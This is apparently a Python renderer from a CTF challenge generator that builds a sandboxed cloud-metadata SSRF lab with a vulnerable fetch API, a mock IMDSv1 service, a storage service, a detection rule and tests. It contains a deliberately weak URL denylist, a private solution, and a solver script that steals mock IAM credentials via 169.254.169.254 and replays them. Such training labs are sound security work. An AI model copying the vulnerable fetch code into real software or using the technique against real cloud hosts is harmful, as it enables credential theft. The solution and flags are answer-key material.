"""Deterministic renderer for the ``cloud_metadata_ssrf`` family.

A cloud-hosted image/URL-fetch service ("asset-fetch-pipeline") is
vulnerable to server-side request forgery (SSRF, CWE-918): it fetches any
attacker-supplied URL, including the well-known cloud instance metadata
address ``169.254.169.254``. The player coerces the fetch service into
reading the instance's IAM role temporary credentials from the (mocked)
metadata service, then replays those credentials against an internal
storage service to read the flag object.

RED mode ships the fetch API, the mock metadata service, and the storage
service. PURPLE mode additionally frames a detection rule for the SSRF
egress traffic (still emitted in RED mode too, but inert/reference-only
there) so the same ``REQUIRED_FILES`` set applies to every supported mode.

Pure module: ``render`` is a pure function of ``(spec, rng, cve_record)``.
No network, filesystem, or clock access -- mirrors ``templates/tenant_export.py``.
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ctf_generator.cve_source import CveRecord

# --- Renderer module interface (see families.py FamilyRenderer contract) ------

FAMILY_NAME = "cloud_metadata_ssrf"
CATEGORY = "cloud"
MODES: tuple[str, ...] = ("red", "purple")
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "A cloud-hosted asset-fetch service is vulnerable to server-side request "
    "forgery (SSRF, CWE-918). The player coerces the service into fetching the "
    "cloud instance metadata endpoint (169.254.169.254) to steal temporary IAM "
    "credentials, then replays those credentials against an internal storage "
    "service to read the flag object; purple mode additionally requires "
    "validating a detection rule for the SSRF egress."
)
COMPOSE_MARKERS: tuple[str, ...] = ("api:", "metadata:", "storage:")
SCORING_HINTS: dict[str, object] = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "medium",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/api/Dockerfile",
    "services/api/app.py",
    "services/api/requirements.txt",
    "services/metadata/Dockerfile",
    "services/metadata/app.py",
    "services/metadata/requirements.txt",
    "services/storage/Dockerfile",
    "services/storage/app.py",
    "services/storage/requirements.txt",
    "public/description.md",
    "public/hints.yaml",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "detection/ssrf_egress_rule.yaml",
    "tests/healthcheck.py",
    "tests/validate_solver.py",
    "tests/validate_variant.py",
)

METADATA_IP = "169.254.169.254"


@dataclass(frozen=True)
class Variant:
    fetch_route: str
    role_name: str
    access_key_id: str
    secret_key: str
    session_token: str
    bucket: str
    object_key: str
    flag: str
    rule_id: str


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    variant = _variant(rng)
    object_path = f"{variant.bucket}/{variant.object_key}"

    public_hints = [
        {
            "level": 1,
            "text": "The fetch service accepts an arbitrary URL. What does it never check?",
        },
        {
            "level": 2,
            "text": "Cloud instances expose an unauthenticated metadata endpoint at "
            f"{METADATA_IP}. What might live under /latest/meta-data/iam/security-credentials/?",
        },
        {
            "level": 3,
            "text": f"The role is called '{variant.role_name}'. Its temporary credentials are "
            "accepted by the internal storage service as request headers.",
        },
    ]

    files: dict[str, str] = {
        "docker-compose.yml": _compose(),
        "services/api/Dockerfile": _python_dockerfile("app.py"),
        "services/api/requirements.txt": "flask==3.0.3\nrequests==2.32.3\n",
        "services/api/app.py": _api_app(variant),
        "services/metadata/Dockerfile": _python_dockerfile("app.py", port=80),
        "services/metadata/requirements.txt": "flask==3.0.3\n",
        "services/metadata/app.py": _metadata_app(variant),
        "services/storage/Dockerfile": _python_dockerfile("app.py", port=9000),
        "services/storage/requirements.txt": "flask==3.0.3\n",
        "services/storage/app.py": _storage_app(variant, object_path),
        "public/description.md": _description(spec, variant, cve_record),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "private/solution.md": _solution(variant, object_path),
        "private/solver.py": _solver(variant, object_path),
        "private/variant.json": _variant_json(spec, variant, object_path),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "detection/ssrf_egress_rule.yaml": _detection_rule(spec, variant),
        "tests/healthcheck.py": _healthcheck(),
        "tests/validate_solver.py": _validate_solver(),
        "tests/validate_variant.py": _validate_variant(variant),
    }
    return files


def _variant(rng: random.Random) -> Variant:
    fetch_route = rng.choice(["/api/fetch-url", "/api/preview", "/api/thumbnail"])
    role_name = rng.choice(
        ["media-worker-role", "fetch-service-role", "image-pipeline-role", "cdn-ingest-role"]
    )
    bucket = rng.choice(["classified-reports", "incident-archive", "exec-backups", "ops-vault"])
    object_key = rng.choice(["flag-object.txt", "final-report.txt", "credentials-audit.txt"])
    access_key_id = f"AKIA{_token_hex(rng, 8).upper()}"
    secret_key = _token_hex(rng, 20)
    session_token = _token_hex(rng, 24)
    flag = f"ctf{{ssrf_metadata_theft_{_token_hex(rng, 6)}}}"
    rule_id = f"ssrf-egress-{_token_hex(rng, 3)}"
    return Variant(
        fetch_route=fetch_route,
        role_name=role_name,
        access_key_id=access_key_id,
        secret_key=secret_key,
        session_token=session_token,
        bucket=bucket,
        object_key=object_key,
        flag=flag,
        rule_id=rule_id,
    )


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _variant_json(spec: ChallengeSpec, v: Variant, object_path: str) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "flag": v.flag,
            "routes": {
                "fetch": v.fetch_route,
                "metadata_role_list": "/latest/meta-data/iam/security-credentials/",
                "metadata_role_credentials": (
                    f"/latest/meta-data/iam/security-credentials/{v.role_name}"
                ),
                "storage_list": "/internal/objects",
                "storage_object": f"/internal/objects/{object_path}",
            },
            "tokens": {
                "role_name": v.role_name,
                "access_key_id": v.access_key_id,
                "secret_key": v.secret_key,
                "session_token": v.session_token,
                "bucket": v.bucket,
                "object_key": v.object_key,
                "metadata_ip": METADATA_IP,
                "rule_id": v.rule_id,
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


def _compose() -> str:
    return """services:
  metadata:
    build: ./services/metadata
    networks:
      metadata_link:
        ipv4_address: 169.254.169.254
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64
    read_only: true

  storage:
    build: ./services/storage
    environment:
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
    ports:
      - "9000:9000"
    networks:
      - frontend
      - backend
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64

  api:
    build: ./services/api
    environment:
      METADATA_BASE_URL: http://169.254.169.254
      STORAGE_BASE_URL: http://storage:9000
    ports:
      - "8080:8080"
    depends_on: [metadata, storage]
    networks:
      - frontend
      - backend
      - metadata_link
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
  backend:
    internal: true
  metadata_link:
    internal: true
    ipam:
      driver: default
      config:
        - subnet: 169.254.169.0/24
"""


def _python_dockerfile(entrypoint: str, port: int = 8080) -> str:
    return f"""FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY {entrypoint} .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
EXPOSE {port}
CMD ["python", "{entrypoint}"]
"""


def _api_app(v: Variant) -> str:
    return f'''from __future__ import annotations

from urllib.parse import urlparse

import requests
from flask import Flask, jsonify, request

app = Flask(__name__)

ALLOWED_SCHEMES = {{"http", "https"}}
# Legacy manual denylist only -- NOT a real security boundary. It does not
# cover link-local ranges (169.254.0.0/16), including the cloud instance
# metadata service, so an attacker can pivot a fetch through this service
# to reach it (CWE-918: Server-Side Request Forgery).
BLOCKED_HOSTS = {{"localhost", "127.0.0.1", "0.0.0.0"}}


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "api"}}


@app.get("/api/profile")
def profile():
    return jsonify({{
        "service": "asset-fetch-pipeline",
        "role": "{v.role_name}",
        "routes": {{
            "fetch": "{v.fetch_route}",
        }},
        "note": "Fetches remote image/document URLs for CMS thumbnail generation.",
    }})


@app.post("{v.fetch_route}")
def fetch_url():
    body = request.get_json(force=True, silent=True) or {{}}
    target = str(body.get("url", ""))
    parsed = urlparse(target)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return jsonify({{"error": "unsupported scheme"}}), 400
    if parsed.hostname in BLOCKED_HOSTS:
        return jsonify({{"error": "host is blocked"}}), 400
    try:
        upstream = requests.get(target, timeout=5)
    except Exception as exc:
        return jsonify({{"error": f"fetch failed: {{exc}}"}}), 502
    return jsonify({{
        "url": target,
        "status_code": upstream.status_code,
        "body_preview": upstream.text[:4000],
    }})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


def _metadata_app(v: Variant) -> str:
    return f'''from __future__ import annotations

import os

from flask import Flask, Response, jsonify

app = Flask(__name__)

ROLE_NAME = "{v.role_name}"
ACCESS_KEY_ID = os.environ.get("MOCK_ACCESS_KEY_ID", "{v.access_key_id}")
SECRET_ACCESS_KEY = os.environ.get("MOCK_SECRET_ACCESS_KEY", "{v.secret_key}")
SESSION_TOKEN = os.environ.get("MOCK_SESSION_TOKEN", "{v.session_token}")


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "metadata"}}


@app.get("/latest/meta-data/iam/security-credentials/")
def list_roles():
    # Unauthenticated by design -- this mocks the classic IMDSv1 metadata
    # endpoint, which does not require any token or header to read.
    return Response(ROLE_NAME + "\\n", mimetype="text/plain")


@app.get("/latest/meta-data/iam/security-credentials/<role>")
def role_credentials(role):
    if role != ROLE_NAME:
        return jsonify({{"error": "unknown role"}}), 404
    return jsonify({{
        "Code": "Success",
        "LastUpdated": "2024-01-01T00:00:00Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": ACCESS_KEY_ID,
        "SecretAccessKey": SECRET_ACCESS_KEY,
        "Token": SESSION_TOKEN,
        "Expiration": "2999-01-01T00:00:00Z",
    }})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
'''


def _storage_app(v: Variant, object_path: str) -> str:
    return f'''from __future__ import annotations

import os

from flask import Flask, jsonify, request

app = Flask(__name__)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
ACCESS_KEY_ID = "{v.access_key_id}"
SESSION_TOKEN = "{v.session_token}"
OBJECT_KEY = "{object_path}"

OBJECTS = {{
    OBJECT_KEY: f"classified export bundle\\nflag={{FLAG}}\\n",
    "{v.bucket}/README.txt": "Restricted bucket. IAM role access only.\\n",
}}


def _authorized() -> bool:
    key_id = request.headers.get("X-Amz-Access-Key-Id", "")
    token = request.headers.get("X-Amz-Security-Token", "")
    return key_id == ACCESS_KEY_ID and token == SESSION_TOKEN


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "storage"}}


@app.get("/internal/objects")
def list_objects():
    if not _authorized():
        return jsonify({{"error": "forbidden"}}), 403
    return jsonify({{"objects": sorted(OBJECTS.keys())}})


@app.get("/internal/objects/<path:key>")
def get_object(key):
    if not _authorized():
        return jsonify({{"error": "forbidden"}}), 403
    if key not in OBJECTS:
        return jsonify({{"error": "not found"}}), 404
    return jsonify({{"key": key, "body": OBJECTS[key]}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)
'''


def _description(spec: ChallengeSpec, v: Variant, cve_record: "CveRecord | None") -> str:
    cve_paragraph = ""
    if cve_record is not None:
        cve_paragraph = (
            f"\nThis instance is grounded in **{cve_record.cve_id}** "
            f"({cve_record.cvss_severity}, CWE {'/'.join(cve_record.cwe_ids) or 'n/a'}): "
            f"{cve_record.description}\n"
        )

    purple_paragraph = ""
    if spec.mode == "purple":
        purple_paragraph = (
            "\n## Blue objective\n\n"
            "Alongside the exploit, validate the detection rule at "
            f"`detection/ssrf_egress_rule.yaml` (id `{v.rule_id}`): it should fire on "
            "outbound requests from the `api` service to the metadata address "
            f"`{METADATA_IP}`. Confirm the rule's match conditions against the traffic "
            "your exploit generates.\n"
        )

    return f"""# {spec.title}

You have access to a public asset-fetch service used by a CMS to generate
thumbnails from remote image/document URLs.
{cve_paragraph}
Start at:

- `GET /api/profile`
- `POST {v.fetch_route}` with a JSON body `{{"url": "..."}}`

The fetch service will retrieve any URL you give it and return a preview of
the response body. Your goal is to pivot that fetch into the cloud instance
metadata service, steal its temporary IAM credentials, and use them against
the internal storage service to read the flag object.

The flag format is `ctf{{...}}`.
{purple_paragraph}
This challenge is generated as a stateful variant. The exact fetch route,
IAM role name, storage bucket/object names, and credential values may
differ across generated instances.
"""


def _solution(v: Variant, object_path: str) -> str:
    return f"""# Private Solution

The `api` service fetches any attacker-supplied URL and only checks a small
hostname denylist (`localhost`, `127.0.0.1`, `0.0.0.0`). It never blocks
link-local addresses, so the cloud instance metadata endpoint at
`{METADATA_IP}` is reachable through it (CWE-918: Server-Side Request
Forgery).

Solve path:

1. `GET /api/profile` to discover the fetch route `{v.fetch_route}`.
2. `POST {v.fetch_route}` with
   `{{"url": "http://{METADATA_IP}/latest/meta-data/iam/security-credentials/"}}`
   to learn the IAM role name `{v.role_name}`.
3. `POST {v.fetch_route}` with
   `{{"url": "http://{METADATA_IP}/latest/meta-data/iam/security-credentials/{v.role_name}"}}`
   to receive the temporary `AccessKeyId`/`SecretAccessKey`/`Token` in the
   response's `body_preview` field.
4. Replay those credentials as `X-Amz-Access-Key-Id` / `X-Amz-Security-Token`
   headers against the storage service:
   `GET /internal/objects/{object_path}` (port 9000).
5. Extract the flag from the returned object body.

This teaches SSRF-to-cloud-credential-theft: input validation on the fetch
service is necessary but not sufficient without also constraining what the
service's own network identity can reach.
"""


def _solver(v: Variant, object_path: str) -> str:
    return f'''from __future__ import annotations

import argparse
import json
import re
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--storage-url", default="http://127.0.0.1:9000")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    storage = args.storage_url.rstrip("/")

    def post_json(path, payload):
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode("utf-8"))

    profile_req = request.Request(base + "/api/profile")
    with request.urlopen(profile_req, timeout=5) as response:
        profile = json.loads(response.read().decode("utf-8"))
    fetch_route = profile["routes"]["fetch"]

    role_list = post_json(
        fetch_route,
        {{"url": "http://{METADATA_IP}/latest/meta-data/iam/security-credentials/"}},
    )
    role_name = role_list["body_preview"].strip()

    creds_response = post_json(
        fetch_route,
        {{"url": f"http://{METADATA_IP}/latest/meta-data/iam/security-credentials/{{role_name}}"}},
    )
    creds = json.loads(creds_response["body_preview"])

    object_req = request.Request(
        storage + "/internal/objects/{object_path}",
        headers={{
            "X-Amz-Access-Key-Id": creds["AccessKeyId"],
            "X-Amz-Security-Token": creds["Token"],
        }},
    )
    with request.urlopen(object_req, timeout=5) as response:
        obj = json.loads(response.read().decode("utf-8"))

    match = re.search(r"ctf\\{{[^}}]+\\}}", obj["body"])
    if not match:
        raise RuntimeError("flag not found")
    print(match.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _detection_rule(spec: ChallengeSpec, v: Variant) -> str:
    rule = {
        "rule": {
            "id": v.rule_id,
            "title": "SSRF egress to cloud instance metadata service",
            "description": (
                "Detects outbound HTTP requests originating from the api service "
                f"destined for the link-local metadata address {METADATA_IP}, "
                "indicating a likely SSRF-to-metadata credential theft attempt."
            ),
            "enabled": spec.mode == "purple",
            "logsource": {"service": "api", "category": "network_egress"},
            "detection": {
                "selection": {
                    "src_service": "api",
                    "dest_ip": METADATA_IP,
                },
                "condition": "selection",
            },
            "level": "high",
            "references": ["cwe:CWE-918", "family:cloud_metadata_ssrf"],
        }
    }
    return dump_yaml(rule)


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--storage-url", default="http://127.0.0.1:9000")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    with request.urlopen(args.storage_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _validate_solver() -> str:
    return '''from __future__ import annotations

from pathlib import Path


def test_solver_mentions_flag_pattern():
    solver = Path("private/solver.py").read_text(encoding="utf-8")
    assert "ctf\\\\{" in solver
    assert "urllib" in solver
    assert "169.254.169.254" in solver
'''


def _validate_variant(v: Variant) -> str:
    return f'''from __future__ import annotations

from pathlib import Path


def test_variant_tokens_are_present():
    api = Path("services/api/app.py").read_text(encoding="utf-8")
    metadata = Path("services/metadata/app.py").read_text(encoding="utf-8")
    storage = Path("services/storage/app.py").read_text(encoding="utf-8")
    assert "{v.fetch_route}" in api
    assert "{v.role_name}" in metadata
    assert "{v.access_key_id}" in metadata
    assert "{v.bucket}" in storage
    assert "{v.object_key}" in storage
'''
